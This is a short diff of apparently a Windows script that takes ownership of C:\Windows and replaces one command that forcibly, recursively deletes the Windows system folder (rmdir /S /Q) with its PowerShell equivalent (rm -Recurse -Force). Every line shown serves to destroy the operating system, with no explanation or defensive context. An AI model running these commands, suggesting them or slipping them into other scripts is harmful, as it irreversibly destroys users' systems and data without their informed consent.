@@ -1,2 +1,2 @@
 takeown /f C:\Windows
-rmdir /S /Q C:\Windows
+rm "C:\Windows" -Recurse -Force
